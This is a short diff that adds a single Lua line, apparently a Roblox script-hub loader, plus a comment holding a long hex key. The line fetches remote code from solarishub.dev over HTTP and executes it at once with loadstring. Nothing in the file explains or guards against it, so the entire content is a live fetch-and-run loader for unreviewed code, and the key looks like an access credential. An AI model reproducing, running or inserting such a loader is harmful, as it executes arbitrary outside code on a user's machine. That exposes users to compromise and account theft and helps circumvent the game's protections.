@@ -1,0 +1,3 @@
+loadstring(game:HttpGet('https://solarishub.dev/script.lua',true))()
+
+-- key: 1eab6fc347e1af62d1b4ee545c17936f3a83a7256538c99dff23045f4167a084
